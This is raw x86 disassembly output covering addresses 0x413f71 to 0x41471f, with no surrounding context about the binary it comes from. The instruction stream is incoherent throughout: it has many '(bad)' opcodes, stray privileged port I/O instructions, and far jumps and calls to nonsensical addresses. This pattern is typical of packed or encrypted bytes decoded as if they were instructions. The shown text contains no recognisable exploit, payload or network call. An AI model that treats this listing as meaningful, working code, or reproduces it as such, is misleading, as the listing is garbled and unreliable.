  413f71:	ins    WORD PTR es:[edi],dx
  413f73:	mov    BYTE PTR [eax-0x4ea3a2ae],al
  413f79:	xchg   DWORD PTR [ebx-0x40f4ddf7],esp
  413f7f:	adc    BYTE PTR [ecx-0x60792e56],0x4b
  413f86:	push   ebx
  413f87:	jmp    0x18d0552e
  413f8c:	add    esi,DWORD PTR [ebp+0xd706285]
  413f92:	in     al,0xf8
  413f94:	push   0xda5f550d
  413f99:	xchg   edi,eax
  413f9a:	dec    ecx
  413f9b:	ins    BYTE PTR es:[edi],dx
  413f9c:	dec    ebp
  413f9d:	jle    0x413fac
  413f9f:	cmc    
  413fa0:	cmp    ebx,DWORD PTR [esi]
  413fa2:	aam    0x86
  413fa4:	adc    ebp,edi
  413fa6:	and    al,0x9c
  413fa8:	leave  
  413fa9:	mov    eax,ss
  413fab:	or     DWORD PTR [edx],edi
  413fad:	sbb    DWORD PTR [edi+esi*8-0x6fb8a327],eax
  413fb4:	shl    BYTE PTR [ebx],0xda
  413fb7:	xlat   BYTE PTR ds:[ebx]
  413fb8:	add    ebx,DWORD PTR [edx-0x34]
  413fbb:	dec    ebp
  413fbc:	arpl   sp,di
  413fbe:	jae    0x41403b
  413fc0:	cld    
  413fc1:	inc    ecx
  413fc2:	jb     0x413fb7
  413fc4:	test   al,0x16
  413fc6:	jecxz  0x413f5f
  413fc8:	fxch   st(7)
  413fca:	lods   eax,DWORD PTR ds:[esi]
  413fcb:	add    ch,BYTE PTR [edi-0xc]
  413fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fcf:	cld    
  413fd0:	inc    ebx
  413fd1:	mov    DWORD PTR [eax+0x50b88424],edi
  413fd7:	add    eax,0xbe45387
  413fdc:	push   edx
  413fdd:	dec    edi
  413fde:	repnz ins DWORD PTR es:[edi],dx
  413fe0:	mov    esp,0x35b6c02f
  413fe5:	das    
  413fe6:	in     al,0x59
  413fe8:	clc    
  413fe9:	inc    edi
  413fea:	mov    bh,ah
  413fec:	ds xchg ebx,eax
  413fee:	xor    eax,0x6d834446
  413ff3:	xchg   ebp,eax
  413ff4:	in     al,0x91
  413ff6:	int3   
  413ff7:	jo     0x41404e
  413ff9:	pop    es
  413ffa:	shl    esi,1
  413ffc:	pop    es
  413ffd:	mov    dh,0xa7
  413fff:	frstor [esi]
  414001:	inc    ebx
  414002:	ja     0x413fe1
  414004:	cmp    eax,eax
  414006:	push   esi
  414007:	gs (bad) 
  414009:	sbb    BYTE PTR [eax+eax*2+0x17e90624],bl
  414010:	pop    esp
  414011:	(bad)  
  414012:	shl    al,1
  414014:	ins    DWORD PTR es:[edi],dx
  414015:	fbstp  TBYTE PTR [ebp+0x1e3e4dcf]
  41401b:	xchg   ecx,eax
  41401c:	pop    edx
  41401d:	aad    0xbd
  41401f:	inc    ecx
  414020:	pop    ds
  414021:	dec    esi
  414022:	mov    ebx,ds
  414024:	adc    esi,DWORD PTR [ebx-0x7a]
  414027:	ficom  DWORD PTR ds:0x7efaf601
  41402d:	fstp   DWORD PTR [edi+0x36]
  414030:	adc    al,0x8a
  414032:	lds    edx,FWORD PTR ds:0x79bd2b3d
  414038:	sbb    edi,eax
  41403a:	test   BYTE PTR ds:[esi],cl
  41403d:	stos   DWORD PTR es:[edi],eax
  41403e:	inc    esi
  41403f:	shl    DWORD PTR [esi+0x45],1
  414042:	sbb    eax,DWORD PTR [ebx]
  414044:	push   ebx
  414045:	cmp    BYTE PTR [ebp+0x2181665],bl
  41404b:	cmp    dl,BYTE PTR [ebx+0x4b]
  41404e:	or     esi,0xa2ef4ff6
  414054:	fidiv  DWORD PTR [ecx+0x7e]
  414057:	mov    esp,0xa3130f04
  41405c:	xchg   ebx,eax
  41405d:	mov    ds:0xb6268cd0,al
  414062:	and    dh,BYTE PTR ds:0x83cfbb91
  414068:	xor    DWORD PTR [ebx-0x3e953e49],eax
  41406e:	rcr    BYTE PTR [edi+0x54],cl
  414071:	jg     0x41406c
  414073:	lahf   
  414074:	pop    edi
  414075:	cmp    cl,BYTE PTR [ebx]
  414077:	mov    edx,edx
  414079:	loopne 0x4140ee
  41407b:	inc    ebp
  41407c:	mov    ecx,0x5df66ce1
  414081:	mov    BYTE PTR [ecx-0xe],0xc
  414085:	jle    0x414047
  414087:	pop    ds
  414088:	push   edi
  414089:	adc    edi,ebx
  41408b:	mov    edi,esp
  41408d:	frstor [eax]
  41408f:	int3   
  414090:	imul   ebp
  414092:	push   esp
  414093:	xor    dl,BYTE PTR [edi-0x1]
  414096:	dec    edi
  414097:	nop
  414098:	in     eax,0x46
  41409a:	jnp    0x414067
  41409c:	and    BYTE PTR [ebx],0x3
  41409f:	(bad)  
  4140a0:	pop    edx
  4140a1:	xor    ch,BYTE PTR [edi-0x2d5e97cd]
  4140a7:	popa   
  4140a8:	push   ebp
  4140a9:	(bad)  
  4140aa:	outs   dx,DWORD PTR ds:[esi]
  4140ab:	popa   
  4140ac:	std    
  4140ad:	pop    esi
  4140ae:	push   cs
  4140af:	sub    al,0xab
  4140b1:	add    DWORD PTR [ecx-0x36],edi
  4140b4:	imul   edi,edx,0xae74ec57
  4140ba:	cdq    
  4140bb:	jae    0x4140d1
  4140bd:	lods   al,BYTE PTR ds:[esi]
  4140be:	dec    esi
  4140bf:	ins    DWORD PTR es:[edi],dx
  4140c0:	aas    
  4140c1:	ja     0x414045
  4140c3:	(bad)  
  4140c4:	cmp    al,0x30
  4140c6:	adc    edx,DWORD PTR [eax+edi*8]
  4140c9:	rcl    ch,cl
  4140cb:	outs   dx,DWORD PTR ds:[esi]
  4140cc:	mov    ecx,DWORD PTR [eax-0x23]
  4140cf:	mov    WORD PTR [esi+eax*4+0x58],fs
  4140d3:	add    BYTE PTR [esi+0x51a25349],0x5f
  4140da:	push   esi
  4140db:	and    DWORD PTR [ebx+0x33],0xbb8e06d
  4140e2:	or     BYTE PTR [ecx-0x64dc38fb],ah
  4140e8:	retf   
  4140e9:	push   esi
  4140ea:	xor    eax,0xb2d41c64
  4140ef:	pop    es
  4140f0:	inc    edx
  4140f1:	adc    eax,0xa9449c07
  4140f6:	sbb    al,0x11
  4140f8:	inc    edx
  4140f9:	pop    eax
  4140fa:	push   ss
  4140fb:	pop    esi
  4140fc:	mov    bh,0x6d
  4140fe:	es mov esp,0x8bc6c2b0
  414104:	mov    WORD PTR [ebp+eax*8+0x860a343],?
  41410b:	add    DWORD PTR [eax-0x755ec1a7],0x6a
  414112:	dec    BYTE PTR [edi]
  414114:	sub    al,0x29
  414116:	dec    ebx
  414117:	fdivr  QWORD PTR [edx-0x57f6230f]
  41411d:	push   edi
  41411e:	and    BYTE PTR [esi+0x4a],0x85
  414122:	dec    edx
  414123:	pop    esi
  414124:	ret    0x6954
  414127:	xor    eax,0xdf246d4d
  41412c:	pop    edx
  41412d:	test   DWORD PTR [esi+0x4c],eax
  414130:	ret    0x411e
  414133:	nop
  414134:	jne    0x414130
  414136:	push   es
  414137:	pop    edi
  414138:	mov    ch,BYTE PTR [ebx]
  41413a:	mov    ecx,0x78b6771c
  41413f:	cmc    
  414140:	inc    esi
  414141:	in     eax,0x17
  414143:	imul   esp,DWORD PTR [ebp+0x39626317],0x3a
  41414a:	push   ds
  41414b:	imul   ebx,DWORD PTR [ebp-0x5],0x373f5c96
  414152:	mov    ch,0x89
  414154:	sbb    al,0xd9
  414156:	sar    DWORD PTR [ecx-0x7a],1
  414159:	lods   eax,DWORD PTR ds:[esi]
  41415a:	fs nop
  41415c:	add    al,0x3c
  41415e:	cdq    
  41415f:	mov    esi,0xe90f18c6
  414164:	pusha  
  414165:	clc    
  414166:	pop    ss
  414167:	iret   
  414168:	push   ebx
  414169:	xchg   edx,eax
  41416a:	pop    eax
  41416b:	out    dx,al
  41416c:	add    eax,0xce809dd8
  414171:	addr16 xor ebp,esp
  414174:	lods   al,BYTE PTR ds:[esi]
  414175:	cmp    bl,BYTE PTR [esi+edx*1-0x27]
  414179:	fdivr  DWORD PTR [ebx+0x2e]
  41417c:	and    ebp,edx
  41417e:	pop    eax
  41417f:	call   FWORD PTR [eax+0x26188104]
  414185:	lock in eax,dx
  414187:	dec    eax
  414188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414189:	or     DWORD PTR [eax+0x5a30b2b],edi
  41418f:	ror    DWORD PTR [edx],0x73
  414192:	pop    ecx
  414193:	lahf   
  414194:	adc    BYTE PTR [eax+0x67],ah
  414197:	retf   0x2ac5
  41419a:	(bad)  
  41419b:	mov    dl,dh
  41419d:	or     eax,esi
  41419f:	cmp    ebp,DWORD PTR [edi]
  4141a1:	xchg   edi,eax
  4141a2:	mov    dh,0xa7
  4141a4:	clc    
  4141a5:	fisttp DWORD PTR [esi+0xb2ce116]
  4141ab:	sub    eax,0xc6967bb3
  4141b0:	lods   al,BYTE PTR ds:[esi]
  4141b1:	mov    ds:0x26b3e76c,eax
  4141b6:	test   DWORD PTR [ebx+0x6a186091],edi
  4141bc:	mov    dl,0xda
  4141be:	jecxz  0x4141dc
  4141c0:	fild   WORD PTR [edi+0x114f63b1]
  4141c6:	jb     0x41419f
  4141c8:	push   esi
  4141c9:	jmp    0xa8f360e0
  4141ce:	outs   dx,DWORD PTR ds:[esi]
  4141cf:	add    eax,0xfb18cac7
  4141d4:	imul   esi,DWORD PTR [ebx-0x1f],0x78751090
  4141db:	xor    DWORD PTR [ebp+esi*1+0x50c225b],esi
  4141e2:	fst    st(7)
  4141e4:	(bad)  
  4141e5:	retf   
  4141e6:	pusha  
  4141e7:	jl     0x4141ab
  4141e9:	inc    edx
  4141ea:	pop    esi
  4141eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141ec:	sub    DWORD PTR [edx-0x652b1989],edx
  4141f2:	outs   dx,BYTE PTR ds:[esi]
  4141f3:	or     BYTE PTR [esi+ecx*1],0xd9
  4141f7:	(bad)  
  4141f9:	inc    eax
  4141fa:	scas   al,BYTE PTR es:[edi]
  4141fb:	repnz (bad) 
  4141fd:	aaa    
  4141fe:	test   BYTE PTR [esi-0x55],ah
  414201:	push   0x24969d4
  414206:	add    ecx,DWORD PTR [ebx]
  414208:	dec    ebp
  414209:	stos   BYTE PTR es:[edi],al
  41420a:	pop    edi
  41420b:	iret   
  41420c:	jmp    0x414282
  41420e:	enter  0xe47,0x4f
  414212:	push   esp
  414213:	inc    esp
  414214:	mov    edi,DWORD PTR es:[esi+eiz*1]
  414218:	and    BYTE PTR [ebp+0x6784f8],dl
  41421e:	push   esp
  41421f:	addr16 out 0xa3,eax
  414222:	jge    0x41421c
  414224:	addr16 jns 0x414216
  414227:	(bad)  
  414228:	into   
  414229:	jmp    0xbf9d:0xd2ca0ba0
  414230:	(bad)  
  414231:	pop    ss
  414232:	int3   
  414233:	dec    esp
  414234:	sahf   
  414235:	and    eax,0xccc5b194
  41423a:	push   ss
  41423b:	cmp    al,BYTE PTR [eax+0x7f]
  41423e:	stos   BYTE PTR es:[edi],al
  41423f:	sbb    eax,DWORD PTR [ecx+ecx*8-0x28]
  414243:	inc    ebx
  414244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414245:	mov    esi,DWORD PTR [esi]
  414247:	popf   
  414248:	es and al,0x1c
  41424b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41424c:	mov    cl,0xb8
  41424e:	mov    eax,0xeb4e0030
  414253:	cmp    al,0xe0
  414255:	shl    DWORD PTR gs:[edi],1
  414258:	fst    st(0)
  41425a:	inc    ecx
  41425b:	sbb    DWORD PTR [esi],eax
  41425d:	int3   
  41425e:	addr16 shl eax,1
  414261:	int3   
  414262:	ret    
  414263:	jne    0x41428b
  414265:	cli    
  414266:	jno    0x4142d8
  414268:	inc    esi
  414269:	jne    0x4141f8
  41426b:	aad    0xd2
  41426d:	inc    esi
  41426e:	add    cl,BYTE PTR [ebx+0x2f]
  414271:	loop   0x41428a
  414273:	jecxz  0x414276
  414275:	xor    ebp,edi
  414277:	test   DWORD PTR [esp+eax*1+0x2dc5b156],edi
  41427e:	aam    0x45
  414280:	mov    edi,0xe6933bec
  414285:	dec    edi
  414286:	push   esi
  414287:	into   
  414288:	pop    eax
  414289:	cwde   
  41428a:	lea    ecx,[ecx-0x6d]
  41428d:	mov    dl,0x9b
  41428f:	imul   esp,DWORD PTR [ebp-0x22d98e2b],0x230a84b6
  414299:	or     al,0xb4
  41429b:	aad    0x37
  41429d:	pop    edi
  41429e:	jmp    ebx
  4142a0:	or     eax,0xce98e5a9
  4142a5:	test   DWORD PTR [edi-0x3474abcd],ebp
  4142ab:	pop    ds
  4142ac:	aad    0x72
  4142ae:	push   0xa394c53a
  4142b3:	imul   eax,DWORD PTR cs:[eax+0x2d2ecc44],0xffffff8e
  4142bb:	cmp    al,0x91
  4142bd:	mov    ch,BYTE PTR [ebx+0x371e0bc3]
  4142c3:	pop    ss
  4142c4:	xchg   BYTE PTR [esi-0x2b],cl
  4142c7:	imul   esp,DWORD PTR [eax-0x2e6d0d38],0x5c
  4142ce:	cld    
  4142cf:	sub    al,0xb4
  4142d1:	leave  
  4142d2:	mov    cl,0xe8
  4142d4:	mov    WORD PTR [edi-0x28],?
  4142d7:	dec    edi
  4142d8:	mov    edx,edi
  4142da:	aam    0x1b
  4142dc:	pop    eax
  4142dd:	jmp    0x25a:0x2aa679ff
  4142e4:	push   eax
  4142e5:	sbb    BYTE PTR [edx+0x7],cl
  4142e8:	add    al,0x84
  4142ea:	xor    al,0x17
  4142ec:	mov    ds:0xc539452c,eax
  4142f1:	je     0x4142b5
  4142f3:	in     al,dx
  4142f4:	pusha  
  4142f5:	cmc    
  4142f6:	fcomp  QWORD PTR [eax+0x4e185365]
  4142fc:	add    DWORD PTR [esi+eiz*1+0x46],ebx
  414300:	ss push 0x7e
  414303:	mov    edx,0x903adb11
  414308:	mov    ecx,0x18e4a727
  41430d:	cmp    ch,BYTE PTR [ecx]
  41430f:	cmp    BYTE PTR [ebx+0x37],dl
  414312:	icebp  
  414313:	or     BYTE PTR [esi+0x56],0x5f
  414317:	in     eax,0xf1
  414319:	cmp    bl,BYTE PTR [edx]
  41431b:	daa    
  41431c:	imul   ebp,DWORD PTR [edx-0x6d],0x710e1d0f
  414323:	lock sbb cl,BYTE PTR [ecx]
  414326:	fwait
  414327:	push   esi
  414328:	pusha  
  414329:	jp     0x414354
  41432b:	sbb    eax,0x407f46d4
  414330:	sub    DWORD PTR [edi+edx*1],edx
  414333:	add    al,0xfc
  414335:	mov    ah,0x81
  414337:	shl    BYTE PTR [esi+0x2b],1
  41433a:	outs   dx,BYTE PTR ds:[esi]
  41433b:	rcr    esi,1
  41433d:	jo     0x4142e8
  41433f:	xchg   esp,eax
  414340:	push   ecx
  414341:	test   eax,0x8bc0e107
  414346:	repz or BYTE PTR [edx-0x2bc95d1a],0x55
  41434e:	cwde   
  41434f:	fdiv   st,st(1)
  414351:	lods   eax,DWORD PTR ds:[esi]
  414352:	jns    0x4143ad
  414354:	test   eax,0x91d31dd8
  414359:	imul   BYTE PTR [esi+0x22b9c217]
  41435f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414360:	xchg   edi,eax
  414361:	xor    bh,BYTE PTR [esi]
  414363:	pushf  
  414364:	iret   
  414365:	inc    edi
  414366:	jae    0x41433a
  414368:	jo     0x4143ca
  41436a:	or     al,al
  41436c:	xchg   edx,eax
  41436d:	call   0x9311:0xcbd02a14
  414374:	push   0xffffff8a
  414376:	rcr    BYTE PTR [ecx+ebx*2+0x636e910],1
  41437d:	test   DWORD PTR [ebx+0x32],edi
  414380:	dec    esi
  414381:	xchg   ecx,eax
  414382:	loop   0x414360
  414384:	or     esi,DWORD PTR [ebp+0x6c5bfa91]
  41438a:	rcr    BYTE PTR [esi+0x33],0x8a
  41438e:	cmp    BYTE PTR [ebp+eiz*8+0x5478a06],bh
  414395:	xchg   edi,eax
  414396:	mov    gs,WORD PTR [edx]
  414398:	pop    edx
  414399:	mov    dl,ah
  41439b:	in     eax,0xa0
  41439d:	jb     0x41433e
  41439f:	xchg   edx,eax
  4143a0:	pop    ebx
  4143a1:	aaa    
  4143a2:	scas   eax,DWORD PTR es:[edi]
  4143a3:	int3   
  4143a4:	and    eax,esp
  4143a6:	out    dx,eax
  4143a7:	xchg   al,dl
  4143a9:	rcr    DWORD PTR [ebx+0x4b5ff7c1],cl
  4143af:	jmp    0x4143ed
  4143b1:	jmp    0x414333
  4143b3:	loopne 0x41434f
  4143b5:	xchg   ebx,eax
  4143b6:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4143b8:	inc    edi
  4143b9:	fnstcw WORD PTR [eax+0x4b34568a]
  4143bf:	push   eax
  4143c0:	cmp    DWORD PTR [ecx+0x3c],0xffffffb8
  4143c4:	cs dec esp
  4143c6:	push   edi
  4143c7:	pop    esi
  4143c8:	jmp    0xd50f:0x7be6ecd7
  4143cf:	sbb    ch,dl
  4143d1:	pushf  
  4143d2:	rcr    bl,cl
  4143d4:	xor    ebx,esp
  4143d6:	add    BYTE PTR [edi-0x7e],ah
  4143d9:	mov    bl,BYTE PTR [edi+0x59c52ce6]
  4143df:	(bad)  
  4143e0:	and    ebp,DWORD PTR [ebp+ecx*8-0xc342b8d]
  4143e7:	test   BYTE PTR [esi+0xc],al
  4143ea:	stos   BYTE PTR es:[edi],al
  4143eb:	ss and al,0xfc
  4143ee:	xchg   ebx,eax
  4143ef:	inc    esp
  4143f0:	rcl    DWORD PTR [esi+edi*1],1
  4143f3:	repz adc cl,BYTE PTR [ebx-0x61c066d6]
  4143fa:	fstp   QWORD PTR [ebp+0x7]
  4143fd:	xor    esp,DWORD PTR [edx]
  4143ff:	and    al,0x25
  414401:	daa    
  414402:	lds    esp,FWORD PTR [ecx]
  414404:	pop    edi
  414405:	mov    ah,0xf1
  414407:	ss ins BYTE PTR es:[edi],dx
  414409:	push   edx
  41440a:	jns    0x4143f9
  41440c:	aas    
  41440d:	dec    ecx
  41440e:	xchg   esi,eax
  41440f:	jmp    0x1fed9954
  414414:	(bad)  
  414415:	iret   
  414416:	retf   0xc18c
  414419:	clc    
  41441a:	sbb    al,0x52
  41441c:	adc    esi,DWORD PTR [ebx-0x61]
  41441f:	cld    
  414420:	arpl   WORD PTR [eax],sp
  414422:	ret    0xa86b
  414425:	cmp    al,0xd6
  414427:	loop   0x414403
  414429:	mov    eax,0x4e17b909
  41442e:	dec    ebx
  41442f:	sub    al,0x71
  414431:	inc    ecx
  414432:	cmp    eax,0x2f3d943d
  414437:	iret   
  414438:	push   ecx
  414439:	xchg   esp,eax
  41443a:	xor    ch,BYTE PTR [eax]
  41443c:	cld    
  41443d:	pop    edi
  41443e:	fild   WORD PTR [ecx-0x55de9418]
  414444:	lods   al,BYTE PTR ds:[esi]
  414445:	aam    0x43
  414447:	(bad)  
  414448:	call   0xb4f5:0x24f06554
  41444f:	shl    BYTE PTR [esi],cl
  414451:	jmp    0x4144b3
  414453:	jmp    0x6126:0xda7b5abb
  41445a:	fs pop esp
  41445c:	outs   dx,DWORD PTR ds:[esi]
  41445d:	push   edi
  41445e:	sub    cl,al
  414460:	xchg   esp,eax
  414461:	push   0xef0b8e1d
  414466:	inc    esp
  414467:	ss mov edx,ecx
  41446a:	sub    BYTE PTR [ecx+0x2be29477],0x32
  414471:	add    al,0x87
  414473:	dec    ecx
  414474:	ja     0x41440a
  414476:	sub    eax,0x7e4af7a1
  41447b:	fisub  DWORD PTR [ecx-0x637fd3f0]
  414481:	loopne 0x4144f4
  414483:	cmp    esi,ebx
  414485:	push   esi
  414486:	fcmovne st,st(4)
  414488:	push   eax
  414489:	pop    ss
  41448a:	mov    edi,DWORD PTR [edi]
  41448c:	sub    eax,DWORD PTR [edi-0x2a]
  41448f:	add    BYTE PTR [edi+0x31],bl
  414492:	jmp    0x1a2b:0xce11b17b
  414499:	inc    edx
  41449a:	jecxz  0x414474
  41449c:	adc    al,0x4f
  41449e:	mov    bh,0x2a
  4144a0:	cmp    bh,BYTE PTR [ebp+0x775b68f6]
  4144a6:	ret    0x85b0
  4144a9:	popa   
  4144aa:	ror    DWORD PTR [edi-0x30],1
  4144ad:	data16 jno 0x41449d
  4144b0:	add    cl,bh
  4144b2:	and    edi,DWORD PTR [eax-0x9]
  4144b5:	ja     0x4144e1
  4144b7:	arpl   si,bx
  4144b9:	fst    DWORD PTR [esi]
  4144bb:	daa    
  4144bc:	xor    BYTE PTR [esi],ah
  4144be:	or     edx,0xffffffe5
  4144c1:	and    ebx,eax
  4144c3:	mov    bl,0xf1
  4144c5:	ror    edi,0x7a
  4144c8:	and    eax,0xa857b227
  4144cd:	popf   
  4144ce:	fnstenv [ebp-0x6f731217]
  4144d4:	sbb    al,0xc1
  4144d6:	call   0x6efc0871
  4144db:	xchg   esi,eax
  4144dc:	in     eax,dx
  4144dd:	mov    BYTE PTR [esi-0xc],bh
  4144e0:	neg    BYTE PTR [eax]
  4144e2:	pop    ds
  4144e3:	pop    ss
  4144e4:	iret   
  4144e5:	outs   dx,DWORD PTR ds:[esi]
  4144e6:	mov    fs,ebx
  4144e8:	xlat   BYTE PTR ds:[ebx]
  4144e9:	ss xchg esp,eax
  4144eb:	arpl   sp,si
  4144ed:	mov    dh,0x4
  4144ef:	in     eax,0xf9
  4144f1:	pop    ebp
  4144f2:	mov    ds:0x390c64cd,al
  4144f7:	and    edi,ecx
  4144f9:	add    DWORD PTR [ecx],eax
  4144fb:	inc    DWORD PTR [edx-0x302caeac]
  414501:	rcl    BYTE PTR [esi-0x2d8cacc6],1
  414507:	mov    bl,bh
  414509:	retf   0x11fc
  41450c:	ins    DWORD PTR es:[edi],dx
  41450d:	xchg   esi,eax
  41450e:	adc    eax,0x926f4d3b
  414513:	call   0x988c2e55
  414518:	mov    cl,0xd4
  41451a:	inc    edi
  41451b:	sbb    BYTE PTR ds:0x4706f62e,bl
  414521:	jge    0x4144df
  414523:	js     0x414503
  414525:	push   ss
  414526:	in     eax,dx
  414527:	mov    al,0x86
  414529:	mov    WORD PTR [esi],cs
  41452b:	hlt    
  41452c:	fcom   QWORD PTR [ebp-0x8]
  41452f:	rcr    DWORD PTR [eax],cl
  414531:	and    eax,0x7895316
  414536:	data16 into 
  414538:	push   ss
  414539:	xor    eax,0x710918ca
  41453e:	and    WORD PTR [ecx],0x44
  414542:	jnp    0x41450d
  414544:	ret    0xae9
  414547:	imul   edi,DWORD PTR [esi],0x6c3fc736
  41454d:	mov    ch,0xfb
  41454f:	(bad)  
  414550:	pop    ecx
  414551:	dec    esi
  414552:	pop    edi
  414553:	mov    ah,0xe9
  414555:	sbb    eax,0x65dffa1
  41455a:	(bad)  
  41455b:	jmp    0x4144f2
  41455d:	out    dx,al
  41455e:	stc    
  41455f:	pop    edi
  414560:	or     bl,dl
  414562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414563:	pop    edi
  414564:	sahf   
  414565:	rol    DWORD PTR ds:0x61cd5f7a,0x4b
  41456c:	into   
  41456d:	in     al,0x4f
  41456f:	inc    edx
  414570:	nop
  414571:	cmc    
  414572:	xor    esp,esp
  414574:	cdq    
  414575:	loop   0x41455f
  414577:	aad    0x69
  414579:	mov    edi,?
  41457b:	adc    BYTE PTR [ecx],ch
  41457d:	jp     0x4145e3
  41457f:	adc    eax,0xb92e991a
  414584:	stos   BYTE PTR es:[edi],al
  414585:	push   esi
  414586:	icebp  
  414587:	cmp    DWORD PTR [ecx+edx*8],ebp
  41458a:	mov    al,0xec
  41458c:	rol    DWORD PTR ds:0x39c36fb0,0xe8
  414593:	xor    ebx,ecx
  414595:	pop    eax
  414596:	jecxz  0x414518
  414598:	div    BYTE PTR [edx]
  41459a:	push   ebx
  41459b:	inc    edx
  41459c:	sub    BYTE PTR [ebx+0x36],dh
  41459f:	into   
  4145a0:	js     0x414576
  4145a2:	(bad)  
  4145a3:	jp     0x414565
  4145a5:	test   eax,0xeb1fe443
  4145aa:	cmp    ah,dh
  4145ac:	ja     0x414575
  4145ae:	sbb    al,0x5d
  4145b0:	and    al,0x70
  4145b2:	and    edx,DWORD PTR [edi+ebx*2+0x22]
  4145b6:	xor    BYTE PTR [ebx],al
  4145b8:	sub    DWORD PTR [ecx+ebp*4],esi
  4145bb:	xchg   ebp,eax
  4145bc:	shl    ecx,0x15
  4145bf:	or     ebp,DWORD PTR cs:[eax]
  4145c2:	mov    ds:0xe059748,eax
  4145c7:	cmovl  edi,DWORD PTR [ebp+eax*1+0x2e]
  4145cc:	(bad)  
  4145cd:	adc    al,0x7d
  4145cf:	xchg   esi,eax
  4145d0:	std    
  4145d1:	and    eax,0x5ed30a2b
  4145d6:	mov    ecx,0x8b492df
  4145db:	sub    ebx,DWORD PTR [ebp-0x22]
  4145de:	dec    edi
  4145df:	call   0x157a7ce8
  4145e4:	pop    ebp
  4145e5:	xchg   edx,eax
  4145e6:	ins    DWORD PTR es:[edi],dx
  4145e7:	mov    al,ds:0x8ea6a485
  4145ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145ed:	xor    eax,0x59177fba
  4145f2:	outs   dx,BYTE PTR ds:[esi]
  4145f3:	jb     0x4145a7
  4145f5:	test   DWORD PTR [edi+0x4d9e1126],edx
  4145fb:	scas   eax,DWORD PTR es:[edi]
  4145fc:	mov    ecx,0x157d2ad7
  414601:	enter  0x5de3,0x6f
  414605:	in     eax,dx
  414606:	jp     0x4145bb
  414608:	jl     0x4145cb
  41460a:	jl     0x41466f
  41460c:	in     eax,dx
  41460d:	(bad)  
  41460e:	mov    dh,0xa8
  414610:	repz loop 0x414672
  414613:	sar    DWORD PTR [esp+ebx*4-0x57],cl
  414617:	or     eax,0x63ea4da4
  41461c:	mov    edx,0xa981a930
  414621:	dec    esi
  414622:	not    DWORD PTR [edx+0x2c949291]
  414628:	mov    cl,0x82
  41462a:	pushf  
  41462b:	mov    ecx,0xd150cf94
  414630:	js     0x4145dc
  414632:	jbe    0x414680
  414634:	rol    DWORD PTR [edx+0x4f],cl
  414637:	jnp    0x4145d3
  414639:	pop    esi
  41463a:	stos   BYTE PTR es:[edi],al
  41463b:	(bad)  
  41463d:	and    ch,BYTE PTR [ecx-0x16813408]
  414643:	inc    edx
  414644:	mov    edi,0x2fa1b761
  414649:	xchg   edx,eax
  41464a:	data16 int 0x64
  41464d:	jns    0x4146cd
  41464f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414650:	mov    DWORD PTR [eax-0x1],esi
  414653:	ror    DWORD PTR [edi],1
  414655:	cmp    DWORD PTR [ecx+0x5d5660f0],ecx
  41465b:	cmp    ebp,esp
  41465d:	inc    edi
  41465e:	sbb    ebp,edi
  414660:	or     ah,BYTE PTR [esi+0x6c]
  414663:	int3   
  414664:	adc    BYTE PTR [esp+edx*4],dh
  414667:	js     0x41462c
  414669:	jecxz  0x41468a
  41466b:	shr    DWORD PTR [esi-0x6719db21],cl
  414671:	shr    edx,cl
  414673:	jb     0x4146b1
  414675:	pop    es
  414676:	stc    
  414677:	lods   eax,DWORD PTR ds:[esi]
  414678:	shl    ah,0xc8
  41467b:	cmp    al,0x2b
  41467d:	mov    dl,0x7e
  41467f:	lods   eax,DWORD PTR ds:[esi]
  414680:	sbb    al,0x45
  414682:	jmp    0x2dfa:0x98e51a0a
  414689:	jbe    0x4146bc
  41468b:	loopne 0x41469d
  41468d:	ins    DWORD PTR es:[edi],dx
  41468e:	xchg   edx,eax
  41468f:	mov    cl,0xa6
  414691:	out    0xe8,al
  414693:	ret    0xa34b
  414696:	sbb    ah,BYTE PTR [eax-0x4977f742]
  41469c:	addr16 push esi
  41469e:	ins    BYTE PTR es:[edi],dx
  41469f:	shr    BYTE PTR [edi],1
  4146a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a2:	call   FWORD PTR [esi-0x3c4f13bf]
  4146a8:	lods   eax,DWORD PTR ds:[esi]
  4146a9:	in     eax,dx
  4146aa:	push   ss
  4146ab:	(bad)  
  4146ac:	inc    ebx
  4146ad:	sbb    BYTE PTR [edi-0x4a],ah
  4146b0:	(bad)  
  4146b1:	mov    ds:0xbcf5ad8b,eax
  4146b6:	lahf   
  4146b7:	lock mov DWORD PTR [edx-0x3a],ebx
  4146bb:	test   eax,0x5324447
  4146c0:	sub    ecx,DWORD PTR [esi+0x73]
  4146c3:	push   esp
  4146c4:	push   edi
  4146c5:	push   esi
  4146c6:	pop    esp
  4146c7:	add    ebp,DWORD PTR [edi]
  4146c9:	sub    eax,0x4ac0ec5c
  4146ce:	repnz or BYTE PTR es:[ecx-0xe],dh
  4146d3:	inc    ecx
  4146d4:	xor    al,0xaa
  4146d6:	mov    bh,0xbe
  4146d8:	imul   DWORD PTR ds:0x1cbf6fed
  4146de:	jbe    0x4146c4
  4146e0:	mov    al,ds:0x95485380
  4146e5:	and    DWORD PTR [edi+eax*2-0x3d],edi
  4146e9:	popf   
  4146ea:	sar    BYTE PTR [ebp-0x35ff62d2],cl
  4146f0:	out    dx,eax
  4146f1:	cld    
  4146f2:	pop    ss
  4146f3:	clc    
  4146f4:	push   ecx
  4146f5:	xor    BYTE PTR [edi+ebp*1+0x3e],0x27
  4146fa:	sub    dh,ah
  4146fc:	lods   al,BYTE PTR ds:[esi]
  4146fd:	or     BYTE PTR [ebx],dh
  4146ff:	mov    al,ds:0x24957a31
  414704:	xor    DWORD PTR [esi+edi*2],ebp
  414707:	cmp    BYTE PTR [esi+eiz*4+0x69],dl
  41470b:	out    dx,eax
  41470c:	mov    ds:0xb88302ad,eax
  414711:	test   al,0xcc
  414713:	dec    ecx
  414714:	fidivr DWORD PTR [edi+0xee63cc]
  41471a:	push   eax
  41471b:	cdq    
  41471c:	xadd   ecx,edi
  41471f:	mov    al,ds:0xc35a6bcc
